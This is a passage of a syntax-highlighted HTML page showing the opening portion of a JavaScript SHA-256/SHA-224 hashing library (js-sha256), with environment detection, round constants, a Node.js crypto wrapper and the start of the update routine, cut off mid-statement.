class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">ERROR</span> = <span class="hljs-string">&#x27;input is invalid type&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">WINDOW</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">&#x27;object&#x27;</span>;<br>    <span class="hljs-keyword">var</span> root = <span class="hljs-variable constant_">WINDOW</span> ? <span class="hljs-variable language_">window</span> : &#123;&#125;;<br>    <span class="hljs-keyword">if</span> (root.<span class="hljs-property">JS_SHA256_NO_WINDOW</span>) &#123;<br>        <span class="hljs-variable constant_">WINDOW</span> = <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">WEB_WORKER</span> = !<span class="hljs-variable constant_">WINDOW</span> &amp;&amp; <span class="hljs-keyword">typeof</span> self === <span class="hljs-string">&#x27;object&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">NODE_JS</span> = !root.<span class="hljs-property">JS_SHA256_NO_NODE_JS</span> &amp;&amp; <span class="hljs-keyword">typeof</span> process === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; process.<span class="hljs-property">versions</span> &amp;&amp; process.<span class="hljs-property">versions</span>.<span class="hljs-property">node</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">NODE_JS</span>) &#123;<br>        root = <span class="hljs-variable language_">global</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">WEB_WORKER</span>) &#123;<br>        root = self<br>    &#125;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">COMMON_JS</span> = !root.<span class="hljs-property">JS_SHA256_NO_COMMON_JS</span> &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">module</span> === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">AMD</span> = <span class="hljs-keyword">typeof</span> define === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="hljs-property">amd</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">ARRAY_BUFFER</span> = !root.<span class="hljs-property">JS_SHA256_NO_ARRAY_BUFFER</span> &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">ArrayBuffer</span> !== <span class="hljs-string">&#x27;undefined&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">HEX_CHARS</span> = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">EXTRA</span> = [-<span class="hljs-number">2147483648</span>, <span class="hljs-number">8388608</span>, <span class="hljs-number">32768</span>, <span class="hljs-number">128</span>];<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">SHIFT</span> = [<span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">var</span> K = [<span class="hljs-number">0x428a2f98</span>, <span class="hljs-number">0x71374491</span>, <span class="hljs-number">0xb5c0fbcf</span>, <span class="hljs-number">0xe9b5dba5</span>, <span class="hljs-number">0x3956c25b</span>, <span class="hljs-number">0x59f111f1</span>, <span class="hljs-number">0x923f82a4</span>, <span class="hljs-number">0xab1c5ed5</span>, <span class="hljs-number">0xd807aa98</span>, <span class="hljs-number">0x12835b01</span>, <span class="hljs-number">0x243185be</span>, <span class="hljs-number">0x550c7dc3</span>, <span class="hljs-number">0x72be5d74</span>, <span class="hljs-number">0x80deb1fe</span>, <span class="hljs-number">0x9bdc06a7</span>, <span class="hljs-number">0xc19bf174</span>, <span class="hljs-number">0xe49b69c1</span>, <span class="hljs-number">0xefbe4786</span>, <span class="hljs-number">0x0fc19dc6</span>, <span class="hljs-number">0x240ca1cc</span>, <span class="hljs-number">0x2de92c6f</span>, <span class="hljs-number">0x4a7484aa</span>, <span class="hljs-number">0x5cb0a9dc</span>, <span class="hljs-number">0x76f988da</span>, <span class="hljs-number">0x983e5152</span>, <span class="hljs-number">0xa831c66d</span>, <span class="hljs-number">0xb00327c8</span>, <span class="hljs-number">0xbf597fc7</span>, <span class="hljs-number">0xc6e00bf3</span>, <span class="hljs-number">0xd5a79147</span>, <span class="hljs-number">0x06ca6351</span>, <span class="hljs-number">0x14292967</span>, <span class="hljs-number">0x27b70a85</span>, <span class="hljs-number">0x2e1b2138</span>, <span class="hljs-number">0x4d2c6dfc</span>, <span class="hljs-number">0x53380d13</span>, <span class="hljs-number">0x650a7354</span>, <span class="hljs-number">0x766a0abb</span>, <span class="hljs-number">0x81c2c92e</span>, <span class="hljs-number">0x92722c85</span>, <span class="hljs-number">0xa2bfe8a1</span>, <span class="hljs-number">0xa81a664b</span>, <span class="hljs-number">0xc24b8b70</span>, <span class="hljs-number">0xc76c51a3</span>, <span class="hljs-number">0xd192e819</span>, <span class="hljs-number">0xd6990624</span>, <span class="hljs-number">0xf40e3585</span>, <span class="hljs-number">0x106aa070</span>, <span class="hljs-number">0x19a4c116</span>, <span class="hljs-number">0x1e376c08</span>, <span class="hljs-number">0x2748774c</span>, <span class="hljs-number">0x34b0bcb5</span>, <span class="hljs-number">0x391c0cb3</span>, <span class="hljs-number">0x4ed8aa4a</span>, <span class="hljs-number">0x5b9cca4f</span>, <span class="hljs-number">0x682e6ff3</span>, <span class="hljs-number">0x748f82ee</span>, <span class="hljs-number">0x78a5636f</span>, <span class="hljs-number">0x84c87814</span>, <span class="hljs-number">0x8cc70208</span>, <span class="hljs-number">0x90befffa</span>, <span class="hljs-number">0xa4506ceb</span>, <span class="hljs-number">0xbef9a3f7</span>, <span class="hljs-number">0xc67178f2</span>];<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">OUTPUT_TYPES</span> = [<span class="hljs-string">&#x27;hex&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;digest&#x27;</span>, <span class="hljs-string">&#x27;arrayBuffer&#x27;</span>];<br>    <span class="hljs-keyword">var</span> blocks = [];<br>    <span class="hljs-keyword">if</span> (root.<span class="hljs-property">JS_SHA256_NO_NODE_JS</span> || !<span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span>) &#123;<br>        <span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">&#x27;[object Array]&#x27;</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; (root.<span class="hljs-property">JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-property">isView</span>)) &#123;<br>        <span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-property">isView</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; obj.<span class="hljs-property">buffer</span> &amp;&amp; obj.<span class="hljs-property">buffer</span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> createOutputMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">outputType, is224</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224, <span class="hljs-literal">true</span>).<span class="hljs-title function_">update</span>(message)[outputType]()<br>            &#125;<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> method = <span class="hljs-title function_">createOutputMethod</span>(<span class="hljs-string">&#x27;hex&#x27;</span>, is224);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">NODE_JS</span>) &#123;<br>                method = <span class="hljs-title function_">nodeWrap</span>(method, is224)<br>            &#125;<br>            method.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224)<br>            &#125;;<br>            method.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                <span class="hljs-keyword">return</span> method.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">update</span>(message)<br>            &#125;;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable constant_">OUTPUT_TYPES</span>.<span class="hljs-property">length</span>; ++i) &#123;<br>                <span class="hljs-keyword">var</span> type = <span class="hljs-variable constant_">OUTPUT_TYPES</span>[i];<br>                method[type] = <span class="hljs-title function_">createOutputMethod</span>(type, is224)<br>            &#125;<br>            <span class="hljs-keyword">return</span> method<br>        &#125;;<br>    <span class="hljs-keyword">var</span> nodeWrap = <span class="hljs-keyword">function</span>(<span class="hljs-params">method, is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;crypto&#x27;)&quot;</span>);<br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Buffer</span> = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;buffer&#x27;).Buffer&quot;</span>);<br>            <span class="hljs-keyword">var</span> algorithm = is224 ? <span class="hljs-string">&#x27;sha224&#x27;</span> : <span class="hljs-string">&#x27;sha256&#x27;</span>;<br>            <span class="hljs-keyword">var</span> nodeMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> message === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>                        <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(algorithm).<span class="hljs-title function_">update</span>(message, <span class="hljs-string">&#x27;utf8&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (message === <span class="hljs-literal">null</span> || message === <span class="hljs-literal">undefined</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                            message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(message) || <span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(message) || message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Buffer</span>) &#123;<br>                        <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(algorithm).<span class="hljs-title function_">update</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(message)).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-title function_">method</span>(message)<br>                    &#125;<br>                &#125;;<br>            <span class="hljs-keyword">return</span> nodeMethod<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createHmacOutputMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">outputType, is224</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">key, message</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HmacSha256</span>(key, is224, <span class="hljs-literal">true</span>).<span class="hljs-title function_">update</span>(message)[outputType]()<br>            &#125;<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createHmacMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> method = <span class="hljs-title function_">createHmacOutputMethod</span>(<span class="hljs-string">&#x27;hex&#x27;</span>, is224);<br>            method.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HmacSha256</span>(key, is224)<br>            &#125;;<br>            method.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key, message</span>) &#123;<br>                <span class="hljs-keyword">return</span> method.<span class="hljs-title function_">create</span>(key).<span class="hljs-title function_">update</span>(message)<br>            &#125;;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable constant_">OUTPUT_TYPES</span>.<span class="hljs-property">length</span>; ++i) &#123;<br>                <span class="hljs-keyword">var</span> type = <span class="hljs-variable constant_">OUTPUT_TYPES</span>[i];<br>                method[type] = <span class="hljs-title function_">createHmacOutputMethod</span>(type, is224)<br>            &#125;<br>            <span class="hljs-keyword">return</span> method<br>        &#125;;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Sha256</span>(<span class="hljs-params">is224, sharedMemory</span>) &#123;<br>        <span class="hljs-keyword">if</span> (sharedMemory) &#123;<br>            blocks[<span class="hljs-number">0</span>] = blocks[<span class="hljs-number">16</span>] = blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span> = blocks<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        &#125;<br>        <span class="hljs-keyword">if</span> (is224) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-number">0xc1059ed8</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-number">0x367cd507</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-number">0x3070dd17</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-number">0xf70e5939</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-number">0xffc00b31</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-number">0x68581511</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-number">0x64f98fa7</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-number">0xbefa4fa4</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-number">0x6a09e667</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-number">0xbb67ae85</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-number">0x3c6ef372</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-number">0xa54ff53a</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-number">0x510e527f</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-number">0x9b05688c</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-number">0x1f83d9ab</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-number">0x5be0cd19</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span> = is224<br>    &#125;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span>) &#123;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> notString, type = <span class="hljs-keyword">typeof</span> message;<br>        <span class="hljs-keyword">if</span> (type !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (message === <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                    message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(message)) &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">ARRAY_BUFFER</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(message)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>            &#125;<br>            notString = <span class="hljs-literal">true</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> code, index = <span class="hljs-number">0</span>,<br>            i, length = message.<span class="hljs-property">length</span>,<br>            blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>;<br>        <span class="hljs-keyword">while</span> (index &lt; length) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">false</span>;<br>                blocks[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>                blocks[<span class="hljs-number">16</span>] = blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (notString) &#123;<br>                <span class="hljs-keyword">for</span> (i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="hljs-number">64</span>; ++index) &#123;<br>                    blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= message[index] &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">for</span> (i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="hljs-number">64</span>; ++index) &#123;<br>                    code = message.<span class="hljs-title function_">charCodeAt</span>(index);<br>                    <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x80</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= code &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x800</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xc0</span> | (code &gt;&gt; <span class="hljs-number">6</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span 